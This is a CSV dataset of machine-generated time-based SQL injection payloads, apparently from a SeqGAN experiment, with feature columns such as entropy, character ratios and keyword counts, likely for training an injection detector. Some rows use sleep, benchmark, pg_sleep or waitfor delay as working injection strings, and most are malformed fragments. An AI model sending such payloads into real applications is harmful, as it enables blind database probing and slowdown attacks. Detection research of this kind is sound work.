label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'praw'  =  'fvtin",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1034,90.0,32.0,4.011600537449018,27.0,22.0,30.0,11.0,0.3,0.24444444444444444,0.3333333333333333,0.12222222222222222,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,select    (  select * from from   (  select  (  5   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1035,53.0,14.0,3.095413315063232,26.0,1.0,21.0,5.0,0.49056603773584906,0.018867924528301886,0.39622641509433965,0.09433962264150944,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,select 5   as k=  7196  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1036,28.0,16.0,3.305435357592952,9.0,5.0,11.0,3.0,0.32142857142857145,0.17857142857142858,0.39285714285714285,0.10714285714285714,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1 or 8466  =  benchmark  (  sleep  (  5  )     )   (  ""%""  select 6969 from from pg_sleep  (  select or 8514  =  (  sleep  (  5  sret  (  5000000,md5  (  5  )   and    (    (  select 4240 from pg_sleep  (  5  )    and    (     (  select 4240 from 4240  7021 #vvwyaq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1037,265.0,39.0,3.8865003247476566,95.0,41.0,103.0,26.0,0.3584905660377358,0.15471698113207547,0.3886792452830189,0.09811320754716982,0.0,2.0,0.0,0.0,0.0,2.0,0.0,17.0,1.0,2.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,4.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"select sleep  (  (  5   )    and   2841  =    (  select 8594 from pg_sleep  (  5  )   and   (  select * 3824  =  1132 sleep  (  sleep  (  sleep  (  5000000,md5  5   6866  1210  =    (  select   (    ( or    (  select pg_sleep  (  sleep  (  5   )    and    (     (  '%'  =select 6969 from '0:0:5' d do    (  select 6793 from where from   (  select  (  5   )    r 4240u    (     (  5rvo",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1038,384.0,38.0,3.6608915892838083,129.0,53.0,162.0,40.0,0.3359375,0.13802083333333334,0.421875,0.10416666666666667,4.0,0.0,0.0,0.0,1.0,4.0,0.0,25.0,1.0,2.0,1.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,8.0,0.0,1.0,4.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0
attack,"select    (  select 3824 waitfor '0:0:2' from pg_sleep  (  select (  5  )   (  select * from   (  select  (  5     )    (  select * from   (  select  (  (    0x694a4745   )     )   and     (  select 4240 from from pg_sleep  (  5  )   -- e 8594  =    (  select 6793 from pg_sleep  (  5000000,1132 sleeplike6969 from 8466  =  6272,sleep  (  sleep  (  5   )    )    and    (  select 6793 from pg_sleep  select 4240 from pg_sleep",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1039,425.0,38.0,3.9479929418347925,172.0,62.0,150.0,41.0,0.4047058823529412,0.14588235294117646,0.35294117647058826,0.09647058823529411,2.0,0.0,2.0,0.0,2.0,2.0,0.0,24.0,0.0,5.0,2.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,11.0,0.0,0.0,9.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,25.0
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  '%y'  =  'ldprlf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1040,99.0,33.0,3.9963836799359482,29.0,21.0,34.0,15.0,0.29292929292929293,0.21212121212121213,0.3434343434343434,0.15151515151515152,6.0,0.0,0.0,0.0,0.0,3.0,0.0,4.0,1.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack," 6793 from and 6793  =    (  select 6793 from from from pg_sleep  (  5   )    )    ru   )    # or 8514  =  7196  (  5000000,md5  (  5   )    )     )  sddo --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1041,157.0,32.0,3.6340116458627647,42.0,30.0,68.0,17.0,0.267515923566879,0.1910828025477707,0.43312101910828027,0.10828025477707007,0.0,0.0,2.0,0.0,0.0,2.0,0.0,10.0,0.0,1.0,1.0,4.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,select benchmark  (  5   -- waitfor '0:0:2' from     (  1915  =  1568  )t  )   )     -- 'rnzp'  =  1132,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1042,103.0,33.0,3.941259002729642,31.0,16.0,39.0,17.0,0.30097087378640774,0.1553398058252427,0.3786407766990291,0.1650485436893204,4.0,0.0,4.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,0.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1' or pg_sleep      (  c     (  select 4240 from pg_sleep  (  5   (  select * from   (  select  (  5  )     )   'rnzp'  =  6866,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1043,127.0,27.0,3.497807108016322,47.0,11.0,54.0,15.0,0.3700787401574803,0.08661417322834646,0.4251968503937008,0.11811023622047244,3.0,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack, sleep  (  select 8594 from pg_sleep  (  0x544d5a4c   (  cr  (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1044,62.0,22.0,3.7284731608615136,28.0,10.0,19.0,5.0,0.45161290322580644,0.16129032258064516,0.3064516129032258,0.08064516129032258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%"" or 6793  5000000,md5  (  0x4c4d6142   and    (     select 6969 from   (  =  1915  =  6272  =  'zanf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1045,103.0,30.0,3.9045566002891214,24.0,32.0,37.0,10.0,0.23300970873786409,0.3106796116504854,0.3592233009708738,0.0970873786407767,1.0,1.0,0.0,0.0,0.0,3.0,0.0,3.0,1.0,0.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1 and elt  (  sleep  (  5000000,md5  select  (  5   and    (     (  select 8594 from pg_sleep  ""uvzc"" 6969 from e from sleepme   (  select 3824 6793  sleep  (  5   )    and    (     (  'wyvx'  =    (    (   5874  =  1915",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1046,220.0,38.0,3.8340585707870996,77.0,35.0,88.0,20.0,0.35,0.1590909090909091,0.4,0.09090909090909091,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,1.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1 or 8466  =  7305 sleep  (  5000000,md5  5000000,md5  (  select benchmark  ( (  (  5   )    )     )     )rasq 8594 * from from   =  ""wucy""  emq benchmark  (  5  )    and e  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1047,176.0,37.0,3.903557089985861,58.0,31.0,67.0,20.0,0.32954545454545453,0.17613636363636365,0.3806818181818182,0.11363636363636363,0.0,2.0,2.0,0.0,1.0,2.0,0.0,11.0,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1 or from from   (    (  ""uvzc"" 8514  =  benchmark  (  5000000,md5  (  5  )   and   (  select * from   (  sleep  (  sleep  (  8507 elt  (  5000000,md5  (  5   and    (     (  5   )    )    )     )  s kv3114  6272  6272  =  '  (  =  2044 from pg_sleep  (  5000000,md5  (  select  6272  (  (  select 6793 from 4240 from from   (  select  (    (  select sleep  (  5   )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1048,370.0,39.0,3.721319376733572,113.0,65.0,154.0,38.0,0.3054054054054054,0.17567567567567569,0.41621621621621624,0.10270270270270271,1.0,2.0,0.0,0.0,1.0,3.0,0.0,27.0,0.0,1.0,3.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,7.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,1 or 8466  sleep  (  (  5  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1049,32.0,15.0,2.9811450333085068,7.0,6.0,15.0,4.0,0.21875,0.1875,0.46875,0.125,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1 where 5000000waitfor 6793  =  vt  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1050,37.0,20.0,3.802991202999011,14.0,12.0,9.0,2.0,0.3783783783783784,0.32432432432432434,0.24324324324324326,0.05405405405405406,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1  )   where 2841  5  )   (     (  select 6793 or from   e  0x4c4d6142   )     )gfye   (  select  (  sleep  (  5   )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1051,125.0,30.0,3.3562716938556605,36.0,18.0,59.0,12.0,0.288,0.144,0.472,0.096,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,1 or 8514  =  benchmark  (  5   )    )     )   (  select * from   (  select  (  sleep  (  5  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1052,98.0,25.0,3.2259216964773882,32.0,7.0,47.0,12.0,0.32653061224489793,0.07142857142857142,0.47959183673469385,0.12244897959183673,0.0,0.0,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1'   )    )     )   waitfor delay '055    )   and    (   -- 7021  =      (  4683 rmq  )        )   )    )    )        (  select , from   (  select  (  6272,sleep  (  0x76555642   )   (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1053,184.0,34.0,3.2800972922714817,40.0,25.0,95.0,24.0,0.21739130434782608,0.1358695652173913,0.5163043478260869,0.13043478260869565,2.0,0.0,2.0,0.0,0.0,1.0,0.0,17.0,0.0,0.0,2.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"'hrta'  )   )    and   'wyvx'  select pg_sleep  (  (  5000000,md5  (  select  (  sleep  (  5   )    )   (  select * from pg_sleep  (  5   )     )   and           (    (  =  sdd5  )     )   r)     )   -- rld5  )     (  y  )    )     )   #uut",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1054,240.0,32.0,3.1551260446531257,68.0,12.0,124.0,36.0,0.2833333333333333,0.05,0.5166666666666667,0.15,4.0,0.0,2.0,0.0,1.0,1.0,0.0,24.0,0.0,2.0,1.0,4.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,1 where from   (  select sleep  (  sleep  (    (  0x76555642   )     )   or   (  select 6969 from       (   5  sddmdo  =  1210ido  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1055,135.0,28.0,3.5214385813029514,47.0,19.0,58.0,11.0,0.34814814814814815,0.14074074074074075,0.42962962962962964,0.08148148148148149,0.0,0.0,0.0,0.0,0.0,1.0,0.0,9.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1 )    -- if from from from   (  select  (  5   )    )     )    and    (     (  select 8594 from, pg_sleep  (  5   )     )   r",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1056,126.0,26.0,3.1623452479526986,41.0,7.0,63.0,15.0,0.3253968253968254,0.05555555555555555,0.5,0.11904761904761904,0.0,0.0,2.0,0.0,0.0,0.0,0.0,11.0,0.0,1.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack, 6969g,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1057,6.0,4.0,1.9182958340544896,1.0,4.0,1.0,0.0,0.16666666666666666,0.6666666666666666,0.16666666666666666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ra)   a)   2388 where from   (  select sleep  (  6272  (  8507 or 4240  =  ""zlal"" from and 4240  =    (f  (  vo  select  (  3114,sleep  (  (  (  0x76555642   )    and    (  select * from   (  select  (  sleep  (  0x544d5a4c   )    (  select * from from  =  (  select  sleep  (  5 ru)  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1058,359.0,40.0,3.940142382293588,124.0,61.0,136.0,38.0,0.34540389972144847,0.16991643454038996,0.3788300835654596,0.10584958217270195,2.0,2.0,0.0,0.0,2.0,4.0,0.0,25.0,0.0,0.0,2.0,6.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,0.0,1.0,5.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0
attack,select benchmark  (  6272  9649 6272  (  =  benchmark  (  5   )    (  select sleep  )  (  0x6d457153   )    )     )    rsu 8594 dh 'p,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1059,133.0,31.0,3.7821366456237158,43.0,25.0,53.0,12.0,0.3233082706766917,0.18796992481203006,0.39849624060150374,0.09022556390977443,1.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack," 6866  =    (h  ""zlal""    ( 6793 from from pg_sleep  (  0x544d5a4c   )    (  select * from   (  select  (  5  )   (  select 4240 from from pg_sleep  (  5000000,md5  (  select   (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1060,184.0,34.0,3.88171909151551,69.0,27.0,67.0,21.0,0.375,0.14673913043478262,0.3641304347826087,0.11413043478260869,0.0,2.0,0.0,0.0,1.0,1.0,0.0,13.0,0.0,2.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,select sleep  (          (  '%' r)  )    (  select 6969 from 6969  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1061,71.0,18.0,3.1622906316881476,22.0,8.0,31.0,10.0,0.30985915492957744,0.11267605633802817,0.43661971830985913,0.14084507042253522,3.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1 ' and    (    (     (  ' 6793  =    (  select * from   (  select  (  sleep  (  5   )     )   or 8514  =  (  5000000,md5  (  (=  6272""  =  9649 and 8594  =    (  select 6793  ==    (  1210,sleep  (  5000000,md5  (  5000000,md5  (  select  (  5000000,md5  (  0x694a4745   )     )#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1062,280.0,33.0,3.5978464014853038,56.0,70.0,116.0,38.0,0.2,0.25,0.4142857142857143,0.1357142857142857,2.0,1.0,0.0,0.0,1.0,7.0,0.0,21.0,0.0,0.0,5.0,8.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,1'r)   )    and   (  select 4240 from 4240  =   (  select from  ( sleep  (  5  )   and   (  select 4240 from pg_sleep  (  sleep  (  0x4c4d6142   )    e like  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1063,159.0,30.0,3.6890184714033865,62.0,21.0,61.0,15.0,0.389937106918239,0.1320754716981132,0.3836477987421384,0.09433962264150944,1.0,0.0,0.0,0.0,0.0,1.0,0.0,11.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,1 or 8514  =  (  5   )    )     )    )   and   'wyvx'yu  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1064,63.0,20.0,2.7846680811584776,11.0,6.0,35.0,11.0,0.1746031746031746,0.09523809523809523,0.5555555555555556,0.1746031746031746,2.0,0.0,2.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,select  '0:0:5' from elt  (  5   )    and    (  select * pg_sleep  (  (  (  0x544d5a4c   )    )     )  sddo f)    )   (  select 6969 #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1065,134.0,28.0,3.5380842517844475,44.0,14.0,57.0,19.0,0.3283582089552239,0.1044776119402985,0.4253731343283582,0.1417910447761194,2.0,0.0,0.0,0.0,1.0,0.0,0.0,12.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
